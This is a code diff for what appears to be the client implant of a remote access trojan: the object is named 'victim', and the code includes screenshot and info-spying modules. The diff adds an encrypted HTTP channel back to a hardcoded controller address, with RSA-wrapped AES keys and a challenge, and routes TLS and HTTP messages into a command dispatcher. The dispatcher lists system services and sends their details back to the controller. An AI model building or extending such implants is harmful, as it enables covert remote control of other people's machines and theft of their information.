@@ -26,8 +26,10 @@ Author: ISSAC
 #include "clsInfoSpyder.hpp"
 #include "clsScreenshot.hpp"
 #include "clsFileMgr.hpp"
+#include "clsProcMgr.hpp"
+#include "clsServMgr.hpp"
 
-std::string g_szIP = "10.98.242.96";
+std::string g_szIP = "0.0.0.0";
 uint16_t g_nPort = 5000;
 
 const int g_nREAD_LENGTH = 65535;
@@ -71,6 +73,7 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
             stInfo.m_bIsRoot ? "1" : "0",
             stInfo.m_szOSName,
         };
+
 
         victim.fnSendCommand(vsInfo);
     }
@@ -146,7 +149,50 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
 
         }
     }
+    else if (vsMsg[0] == "proc")
+    {
+        clsProcMgr procMgr;
+
+        if (vsMsg[1] == "ls")
+        {
+
+        }
+    }
+    else if (vsMsg[0] == "srv")
+    {
+        clsServMgr srvMgr;
+
+        if (vsMsg[1] == "ls")
+        {
+            std::vector<std::vector<std::string>> lsService;
+            auto services = srvMgr.fnGetServices();
+            for (auto& s : services)
+            {
+                std::vector<std::string> vsSrv = {
+                    s.szName,
+                    s.szDescription,
+                    s.szLoadState,
+                    s.szActiveState,
+                    s.szSubState,
+                    s.szMainPid,
+                    s.szExecStart,
+                };
+
+                lsService.push_back(vsSrv);
+            }
+
+            std::vector<std::string> vsMsg = {
+                "srv",
+                "ls",
+                clsEZData::fnszSend2dParser(lsService),
+            };
+
+            victim.fnSendCommand(vsMsg);
+        }
+    }
 }
+
+#pragma region Connection Handler
 
 void fnTcpHandler(int sktSrv)
 {
@@ -156,7 +202,7 @@ void fnTcpHandler(int sktSrv)
     std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
     std::vector<unsigned char> vuDynamicRecvBuf;
 
-    clsVictim victim(sktSrv);
+    clsVictim victim(clsVictim::enMethod::TCP, sktSrv);
 
     // initial handshake
     victim.fnSendCmdParam(0, 0);
@@ -194,7 +240,6 @@ void fnTcpHandler(int sktSrv)
             vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet
 
             auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
-
 
             // === handle packet ===
             if (cmd == 0)
@@ -258,49 +303,162 @@ void fnTcpHandler(int sktSrv)
 
 void fnHttpHandler(int sktSrv)
 {
+    clsTools::fnLogInfo("Starting session...");
 
+    int nMaxRecv = 1024 * 1024 * 10;
+    int nRecv = 0;
+    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
+    std::vector<unsigned char> vuDynamicRecvBuf;
+
+    clsHttpPkt http;
+    clsVictim victim(clsVictim::enMethod::HTTP, sktSrv, http);
+
+    // initial handshake
+    //victim.fnSendCmdParam(0, 0);
+
+    do
+    {
+        vuDynamicRecvBuf.clear();
+        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
+        nRecv = recv(sktSrv, vuStaticRecvBuf.data(), vuStaticRecvBuf.size(), 0);
+
+        if (nRecv <= 0)
+            break; // socket closed or error
+
+        // Append to dynamic buffer
+        vuDynamicRecvBuf.insert(
+            vuDynamicRecvBuf.end(),
+            vuStaticRecvBuf.begin(),
+            vuStaticRecvBuf.begin() + nRecv);
+
+        std::string szRecv(vuDynamicRecvBuf.begin(), vuDynamicRecvBuf.end());
+        
+        auto result = clsHttpPkt::fnParseHttpResponse(szRecv);
+        std::string szBody = result.szBody;
+        BUFFER abMsg = clsEZData::fnb64Decode(szBody);
+        clsEDP edp(abMsg);
+        
+        auto[nCommand, nParam, nLength, vuMsg] = edp.fnGetMsg();
+        std::string szMsg(vuMsg.begin(), vuMsg.end());
+
+        if (nCommand == 0)
+        {
+            if (nParam == 0)
+            {
+
+            }
+        }
+        else if (nCommand == 1)
+        {
+            if (nParam == 0)
+            {
+                BUFFER abRsaPublicKey = clsEZData::fnb64Decode(szMsg);
+
+                // create crypto with RSA key
+                clsCrypto crypto(abRsaPublicKey);
+                victim.m_crypto = crypto;
+
+                // generate AES key+IV, encrypt, and send
+                auto [vuAESKey, vuAESIV] = victim.m_crypto.fnCreateAESKey();
+                BUFFER ucKey(vuAESKey.begin(), vuAESKey.end());
+                BUFFER ucIV(vuAESIV.begin(), vuAESIV.end());
+
+                std::ostringstream oss;
+                oss << clsEZData::fnb64Encode(ucKey) << "|" << clsEZData::fnb64Encode(ucIV);
+
+                std::string szMsg = oss.str();
+                std::string szCipherMsg = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuRSAEncrypt(szMsg));
+
+                victim.fnSend(1, 1, szCipherMsg);
+            }
+            else if (nParam == 2)
+            {
+                std::string szChallenge(reinterpret_cast<const char*>(vuMsg.data()), vuMsg.size());
+                std::string szCipher = clsEZData::fnb64EncodeUtf8(victim.m_crypto.fnvuAESEncrypt(szChallenge));
+
+                victim.fnSend(1, 3, szCipher);
+            }
+        }
+        else if (nCommand == 2)
+        {
+            if (nParam == 0)
+            {
+                std::vector<unsigned char> vuPlain = victim.m_crypto.fnvuAESDecrypt(vuMsg);
+                std::string szMsg(vuPlain.begin(), vuPlain.end());
+
+                auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
+             
+                fnRecvCommand(victim, decoded);
+            }
+        }
+
+    } while (nRecv > 0);
+
+    clsTools::fnLogErr("Session is terminated.");
 }
 
 void fnTlsHandler(int nSktSrv, SSL* ssl)
 {
-    clsVictim victim(nSktSrv, ssl);
-    std::string szHello = "Hello TLS Server";
-    victim.fnSslSend(szHello);
+    clsTools::fnLogInfo("Starting session...");
 
-    std::vector<unsigned char> vuDynamicBuffer;
-    std::vector<unsigned char> vuStaticbuffer(clsEDP::MAX_SIZE);
+    clsVictim victim(clsVictim::enMethod::TLS, nSktSrv, ssl);
+    std::string szHello = "Hello TLS Server";
+
+    victim.fnSendCommand(szHello);
+
+    std::vector<unsigned char> vuStaticRecvBuf(g_nREAD_LENGTH);
+    std::vector<unsigned char> vuDynamicRecvBuf;
     int nRecv = 0;
 
     do
     {
-        nRecv = SSL_read(ssl, vuStaticbuffer.data(), vuStaticbuffer.size());
+        // Receive data
+        std::fill(vuStaticRecvBuf.begin(), vuStaticRecvBuf.end(), 0);
+        nRecv = SSL_read(ssl, vuStaticRecvBuf.data(), vuStaticRecvBuf.size());
+
         if (nRecv <= 0)
-            break;
-        
-        vuDynamicBuffer.insert(
-            vuDynamicBuffer.end(),
-            vuStaticbuffer.begin(),
-            vuStaticbuffer.begin() + nRecv
-        );
+            break; // socket closed or error
 
-        while (vuDynamicBuffer.size() >= clsEDP::HEADER_SIZE)
+        // Append to dynamic buffer
+        vuDynamicRecvBuf.insert(
+            vuDynamicRecvBuf.end(),
+            vuStaticRecvBuf.begin(),
+            vuStaticRecvBuf.begin() + nRecv);
+
+        // --- Process complete packets ---
+        while (true)
         {
-            auto [cmd, param, len] = clsEDP::fnGetHeader(vuDynamicBuffer);
-            if (vuDynamicBuffer.size() < clsEDP::HEADER_SIZE + len)
+            // not enough for header yet
+            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE)
                 break;
-            
-            clsEDP edp(vuDynamicBuffer);
-            vuDynamicBuffer = edp.fnGetMoreData();
 
-            auto [nCmd, nParam, nLength, vuMsg] = edp.fnGetMsg();
+            auto [nCommand, nParam, nLength] = clsEDP::fnGetHeader(vuDynamicRecvBuf);
+
+            // incomplete packet — wait for next recv
+            if (vuDynamicRecvBuf.size() < clsEDP::HEADER_SIZE + static_cast<size_t>(nLength))
+                break;
+
+            // construct EDP from full message
+            clsEDP edp(vuDynamicRecvBuf);
+            vuDynamicRecvBuf = edp.fnGetMoreData();  // consume one packet
+
+            auto [cmd, param, len, vuMsg] = edp.fnGetMsg();
+
             std::string szMsg(vuMsg.begin(), vuMsg.end());
-            std::cout << szMsg << std::endl;
 
+            auto decoded = clsEZData::fnvsB64ToVectorStringParser(szMsg);
+            
+            fnRecvCommand(victim, decoded);
         }
 
     } while (nRecv > 0);
     
+    clsTools::fnLogInfo("Session is terminated.");
 }
+
+#pragma endregion
+
+#pragma region Connection
 
 void fnTcpConnect(std::string& szIP, int nPort)
 {
@@ -312,7 +470,6 @@ void fnTcpConnect(std::string& szIP, int nPort)
 
     if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
     {
-
         perror("connect");
     }
     else
@@ -338,7 +495,7 @@ void fnTlsConnect(std::string& szIP, int nPort)
     srvAddr.sin_family = AF_INET;
     srvAddr.sin_port = htons(nPort);
     inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
-
+    
     if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
     {
         perror("connect");
@@ -370,19 +527,22 @@ void fnHttpConnect(std::string& szIP, int nPort)
 
     if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
     {
-
         perror("connect");
     }
     else
     {
         fnHttpHandler(sktSrv);
     }
+
+    close(sktSrv);
 }
 
 void fnDnsConnect(std::string& szIP, int nPort)
 {
 
 }
+
+#pragma endregion
 
 int main(int argc, char *argv[])
 {
@@ -431,7 +591,7 @@ int main(int argc, char *argv[])
                 fnTlsConnect(g_szIP, g_nPort);
                 break;
             case enConnectionMethod::HTTP:
-
+                fnHttpConnect(g_szIP, g_nPort);
                 break;
             case enConnectionMethod::DNS:
 
